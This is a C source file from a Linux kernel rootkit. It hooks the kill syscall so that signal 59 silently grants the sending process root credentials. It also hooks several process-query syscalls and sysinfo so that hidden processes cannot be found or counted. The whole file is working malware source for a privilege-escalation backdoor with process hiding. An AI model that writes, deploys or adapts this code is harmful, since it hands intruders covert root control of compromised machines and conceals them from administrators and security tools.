/* become_root.c — Privilege escalation via signal 59 + PID hiding.
 *
 * Signal 59 (unused by POSIX) triggers uid=0 commit_creds() for the
 * sending process. Secondary effect: hides the process tree and blocks
 * common PID-enumeration syscalls for hidden PIDs.
 *
 * Hooked syscalls (all via ARCH_SYS for ARM64/x86_64 portability):
 *   kill, getpgid, getpgrp, getsid, sched_getaffinity, sched_getparam,
 *   sched_getscheduler, sched_rr_get_interval, sysinfo, pidfd_open
 *
 * Port from Singularity — ARCH_SYS() + REGS_ARGn for portability.
 */
#include "../include/core.h"
#include "../include/become_root.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/pid_manager.h"

static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getsid)(const struct pt_regs *);
static asmlinkage long (*orig_sched_getaffinity)(const struct pt_regs *);
static asmlinkage long (*orig_sched_getparam)(const struct pt_regs *);
static asmlinkage long (*orig_sched_getscheduler)(const struct pt_regs *);
static asmlinkage long (*orig_sched_rr_get_interval)(const struct pt_regs *);
static asmlinkage long (*orig_sysinfo)(const struct pt_regs *);
static asmlinkage long (*orig_pidfd_open)(const struct pt_regs *);
static asmlinkage long (*orig_getpgid)(const struct pt_regs *);
static asmlinkage long (*orig_getpgrp)(const struct pt_regs *);

static notrace void SpawnRoot(void);

static notrace void hide_process_tree(void)
{
    struct task_struct *task;
    struct list_head *list;

    if (!current)
        return;

    add_hidden_pid(current->pid);
    add_hidden_pid(current->tgid);

    list_for_each(list, &current->children) {
        task = list_entry(list, struct task_struct, sibling);
        if (task) {
            add_child_pid(task->pid);
            add_child_pid(task->tgid);
        }
    }

    if (current->signal) {
        struct task_struct *t = current;
        do {
            add_hidden_pid(t->pid);
        } while_each_thread(current, t);
    }
}

static notrace asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int pid    = (int)REGS_ARG0(regs);
    int signal = (int)REGS_ARG1(regs);

    if (signal == 59) {
        hide_process_tree();
        msleep(50);
        SpawnRoot();

        if (pid > 0 && pid != current->pid) {
            add_hidden_pid(pid);
            add_child_pid(pid);
        }
        return 0;
    }

    if (signal == 0 && pid > 0 && is_hidden_pid(pid))
        return -ESRCH;

    if (!orig_kill)
        return -ENOSYS;

    return orig_kill(regs);
}

static notrace asmlinkage long hook_pidfd_open(const struct pt_regs *regs)
{
    int pid = (int)REGS_ARG0(regs);

    if (pid > 0 && is_hidden_pid(pid))
        return -ESRCH;
    if (!orig_pidfd_open)
        return -ENOSYS;
    return orig_pidfd_open(regs);
}

static notrace asmlinkage long hook_getsid(const struct pt_regs *regs)
{
    int pid = (int)REGS_ARG0(regs);
    if (pid > 0 && is_hidden_pid(pid))
        return -ESRCH;
    if (!orig_getsid)
        return -ENOSYS;
    return orig_getsid(regs);
}

static notrace asmlinkage long hook_sched_getaffinity(const struct pt_regs *regs)
{
    int pid = (int)REGS_ARG0(regs);
    if (pid > 0 && is_hidden_pid(pid))
        return -ESRCH;
    if (!orig_sched_getaffinity)
        return -ENOSYS;
    return orig_sched_getaffinity(regs);
}

static notrace asmlinkage long hook_sched_getparam(const struct pt_regs *regs)
{
    int pid = (int)REGS_ARG0(regs);
    if (pid > 0 && is_hidden_pid(pid))
        return -ESRCH;
    if (!orig_sched_getparam)
        return -ENOSYS;
    return orig_sched_getparam(regs);
}

static notrace asmlinkage long hook_sched_getscheduler(const struct pt_regs *regs)
{
    int pid = (int)REGS_ARG0(regs);
    if (pid > 0 && is_hidden_pid(pid))
        return -ESRCH;
    if (!orig_sched_getscheduler)
        return -ENOSYS;
    return orig_sched_getscheduler(regs);
}

static notrace asmlinkage long hook_sched_rr_get_interval(const struct pt_regs *regs)
{
    int pid = (int)REGS_ARG0(regs);
    if (pid > 0 && is_hidden_pid(pid))
        return -ESRCH;
    if (!orig_sched_rr_get_interval)
        return -ENOSYS;
    return orig_sched_rr_get_interval(regs);
}

static notrace asmlinkage long hook_sysinfo(const struct pt_regs *regs)
{
    void __user *user_info = (void __user *)REGS_ARG0(regs);
    long ret;

    if (!user_info || !orig_sysinfo)
        return orig_sysinfo ? orig_sysinfo(regs) : -ENOSYS;

    ret = orig_sysinfo(regs);
    if (ret != 0)
        return ret;

    {
        struct sysinfo kinfo;
        if (copy_from_user(&kinfo, user_info, sizeof(kinfo)) != 0)
            return ret;

        {
            int hidden_nr = hidden_pid_count();
            if (hidden_nr > 0 && kinfo.procs > hidden_nr)
                kinfo.procs -= hidden_nr;
        }
        (void)copy_to_user(user_info, &kinfo, sizeof(kinfo));
    }
    return ret;
}

static notrace asmlinkage long hook_getpgid(const struct pt_regs *regs)
{
    int pid = (int)REGS_ARG0(regs);

    if (pid == 0) {
        if (!current)
            return orig_getpgid ? orig_getpgid(regs) : -ENOSYS;
        pid = current->tgid;
    }
    if (pid > 0 && is_hidden_pid(pid))
        return -ENOENT;
    if (!orig_getpgid)
        return -ENOSYS;
    return orig_getpgid(regs);
}

static notrace asmlinkage long hook_getpgrp(const struct pt_regs *regs)
{
    if (current && is_hidden_pid(current->tgid))
        return -ENOENT;
    if (!orig_getpgrp)
        return -ENOSYS;
    return orig_getpgrp(regs);
}

static notrace void SpawnRoot(void)
{
    struct cred *newcredentials;

    newcredentials = prepare_creds();
    if (!newcredentials)
        return;

    newcredentials->uid.val   = 0;
    newcredentials->gid.val   = 0;
    newcredentials->suid.val  = 0;
    newcredentials->sgid.val  = 0;
    newcredentials->fsuid.val = 0;
    newcredentials->fsgid.val = 0;
    newcredentials->euid.val  = 0;
    newcredentials->egid.val  = 0;

    commit_creds(newcredentials);
}

static struct ftrace_hook hooks[] = {
    HOOK(ARCH_SYS("kill"),                    hook_kill,                    &orig_kill),
    HOOK(ARCH_SYS("getpgid"),                 hook_getpgid,                 &orig_getpgid),
    HOOK(ARCH_SYS("getpgrp"),                 hook_getpgrp,                 &orig_getpgrp),
    HOOK(ARCH_SYS("getsid"),                  hook_getsid,                  &orig_getsid),
    HOOK(ARCH_SYS("sched_getaffinity"),       hook_sched_getaffinity,       &orig_sched_getaffinity),
    HOOK(ARCH_SYS("sched_getparam"),          hook_sched_getparam,          &orig_sched_getparam),
    HOOK(ARCH_SYS("sched_getscheduler"),      hook_sched_getscheduler,      &orig_sched_getscheduler),
    HOOK(ARCH_SYS("sched_rr_get_interval"),   hook_sched_rr_get_interval,   &orig_sched_rr_get_interval),
    HOOK(ARCH_SYS("sysinfo"),                 hook_sysinfo,                 &orig_sysinfo),
    HOOK(ARCH_SYS("pidfd_open"),              hook_pidfd_open,              &orig_pidfd_open),
};

int become_root_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

void become_root_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
